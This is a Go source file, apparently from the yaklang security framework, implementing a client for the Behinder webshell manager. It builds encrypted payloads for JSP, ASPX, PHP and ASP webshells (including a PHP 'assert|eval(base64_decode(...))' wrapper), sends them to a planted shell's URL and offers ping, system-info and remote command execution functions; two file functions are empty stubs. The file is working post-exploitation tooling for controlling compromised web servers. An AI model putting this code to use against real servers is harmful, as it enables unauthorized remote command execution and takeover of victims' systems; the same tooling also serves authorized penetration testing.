package wsm

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/wsm/payloads/behinder"
	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
)

type Behinder struct {
	// 连接地址
	Url string
	// 密钥
	SecretKey []byte
	// shell 类型
	ShellScript string

	Proxy string
	// response 开头的干扰字符
	respPrefixLen int
	// response 结尾的干扰字符
	respSuffixLen int
	// 自定义 header 头
	Headers       map[string]string
	Client        *http.Client
	CustomEncoder EncoderFunc
}

func NewBehinder(ys *ypb.WebShell) *Behinder {
	client := utils.NewDefaultHTTPClient()

	bs := &Behinder{
		Url:           ys.GetUrl(),
		SecretKey:     secretKey(ys.GetSecretKey()),
		ShellScript:   ys.GetShellScript(),
		Proxy:         ys.GetProxy(),
		respPrefixLen: 0,
		respSuffixLen: 0,
		Headers:       make(map[string]string, 2),
		Client:        client,
	}
	// 默认的加密方式
	bs.CustomEncoder = func(raw []byte) ([]byte, error) {
		payload, err := behinder.Encryption(raw, bs.SecretKey, bs.ShellScript)
		if err != nil {
			return nil, err
		}
		return payload, nil
	}
	bs.setHeaders()
	if len(bs.Proxy) != 0 {
		bs.setProxy()
	}
	return bs
}

func (b *Behinder) setHeaders() {
	switch b.ShellScript {
	case ypb.ShellScript_JSP.String():
		fallthrough
	case ypb.ShellScript_JSPX.String():
		fallthrough
		//b.Headers["Content-type"] = "application/x-www-form-urlencoded"
	case ypb.ShellScript_ASPX.String():
		b.Headers["Content-type"] = "application/octet-stream"
	case ypb.ShellScript_PHP.String():
		b.Headers["Content-type"] = "application/x-www-form-urlencoded"
	case ypb.ShellScript_ASP.String():
		b.Headers["Content-type"] = "application/x-www-form-urlencoded"
	default:
		panic("shell script type error [jsp/jspx/asp/aspx/php]")
	}
}

func (b *Behinder) setProxy() {
	b.Client.Transport = &http.Transport{
		Proxy: func(r *http.Request) (*url.URL, error) {
			return url.Parse(b.Proxy)
		},
	}
}

func (b *Behinder) getPayload(binCode behinder.Payload, params map[string]string) ([]byte, error) {
	var code []byte
	var err error
	hexCode := behinder.HexPayload[b.ShellScript][binCode]
	switch b.ShellScript {
	case ypb.ShellScript_JSPX.String():
		fallthrough
	case ypb.ShellScript_JSP.String():
		code, err = behinder.GetRawClass(hexCode, params)
		if err != nil {
			return nil, err
		}
	case ypb.ShellScript_PHP.String():
		code, err = behinder.GetRawPHP(hexCode, params)
		if err != nil {
			return nil, err
		}
		//code = []byte(("lasjfadfas.assert|eval(base64_decode('" + string(bincls) + "'));"))
		code = []byte(("assert|eval(base64_decode('" + base64.StdEncoding.EncodeToString(code) + "'));"))
	case ypb.ShellScript_ASPX.String():
		code, err = behinder.GetRawAssembly(hexCode, params)
		if err != nil {
			return nil, err
		}
	case ypb.ShellScript_ASP.String():
		code, err = behinder.GetRawASP(hexCode, params)
		if err != nil {
			return nil, err
		}
	}
	return b.CustomEncoder(code)
	//return code, nil
	//return b.Encoder(nativeCryption())
}

// 原生的加密方式
func (b *Behinder) enCryption(binCode []byte) ([]byte, error) {
	payload, err := behinder.Encryption(binCode, b.SecretKey, b.ShellScript)
	if err != nil {
		return nil, err
	}
	return payload, nil
}

//func bNativeCryption(r []byte) EncoderFunc {
//	return func(bi interface{}) ([]byte, error) {
//		b := bi.(*Behinder)
//		payload, err := behinder.Encryption(r, b.SecretKey, b.ShellScript)
//		if err != nil {
//			return nil, err
//		}
//		return payload, nil
//	}
//}

func (b *Behinder) deCryption(raw []byte) ([]byte, error) {
	var targetBts []byte
	// 提取一下 resp raw body 中的需要的结果
	if (b.respSuffixLen != 0 || b.respPrefixLen != 0) && len(raw)-b.respPrefixLen >= b.respSuffixLen {
		targetBts = raw[b.respPrefixLen : len(raw)-b.respSuffixLen]
	} else {
		targetBts = raw
	}
	return behinder.Decryption(targetBts, b.SecretKey, b.ShellScript)
}

func (b *Behinder) post(data []byte) ([]byte, error) {
	request, err := http.NewRequest(http.MethodPost, b.Url, bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	for k, v := range b.Headers {
		request.Header.Set(k, v)
	}
	resp, err := b.Client.Do(request)
	if err != nil {
		return nil, err
	}
	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
			log.Error(err)
		}
	}(resp.Body)
	raw, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	raw = bytes.TrimRight(raw, "\r\n\r\n")
	if len(raw) == 0 {
		return nil, utils.Error("返回数据为空")
	}
	return raw, nil
}

func (b *Behinder) sendPayload(data []byte) ([]byte, error) {
	body, err := b.post(data)
	if err != nil {
		return nil, err
	}
	return b.deCryption(body)
}

//func (b *Behinder) Encoder(encoderFunc EncoderFunc) ([]byte, error) {
//	b.CustomEncoder = encoderFunc
//
//	return nil, nil
//}

func (b *Behinder) Encoder(f func(raw []byte) ([]byte, error)) {
	b.CustomEncoder = f
}

func (b *Behinder) Unmarshal(bts []byte, m map[string]string) error {
	err := json.Unmarshal(bts, &m)
	if err != nil {
		return err
	}
	for k, v := range m {
		value, _ := base64.StdEncoding.DecodeString(v)
		m[k] = string(value)
	}

	return nil
}

func (b *Behinder) Ping(opts ...behinder.ParamsConfig) (bool, error) {
	params := map[string]string{
		"content": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
	}
	params = behinder.ProcessParams(params, opts...)

	payload, err := b.getPayload(behinder.EchoGo, params)
	if err != nil {
		return false, err
	}
	body, err := b.post(payload)
	if err != nil {
		return false, err
	}
	res, err := b.deCryption(body)
	if err != nil {
		return false, err
	}
	log.Infof("%q", res)
	return true, nil
}

func (b *Behinder) BasicInfo(opts ...behinder.ParamsConfig) ([]byte, error) {
	params := map[string]string{
		"whatever": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
	}
	params = behinder.ProcessParams(params, opts...)
	payload, err := b.getPayload(behinder.BasicInfoGo, params)
	if err != nil {
		return nil, err
	}
	bs64res, err := b.sendPayload(payload)
	if err != nil {
		return nil, err
	}
	log.Infof("%q", bs64res)
	resJson := make(map[string]string)
	err = b.Unmarshal(bs64res, resJson)
	if err != nil {
		return nil, err
	}
	jsonByte, err := json.Marshal(resJson)
	if err != nil {
		return nil, err
	}
	//log.Infof("%q", jsonByte)

	return jsonByte, nil
}

func (b *Behinder) CommandExec(cmd string, opts ...behinder.ParamsConfig) ([]byte, error) {
	params := map[string]string{
		"cmd":  cmd,
		"path": "/",
	}
	params = behinder.ProcessParams(params, opts...)
	payload, err := b.getPayload(behinder.CmdGo, params)
	if err != nil {
		return nil, err
	}
	bs64res, err := b.sendPayload(payload)
	if err != nil {
		return nil, err
	}
	log.Infof("%q", bs64res)
	resJson := make(map[string]string)
	err = b.Unmarshal(bs64res, resJson)
	if err != nil {
		return nil, err
	}
	jsonByte, err := json.Marshal(resJson)
	if err != nil {
		return nil, err
	}
	log.Infof("%q", jsonByte)

	return jsonByte, nil
}

func (b *Behinder) FileManagement() {

}

func (b *Behinder) ShowFile() {

}
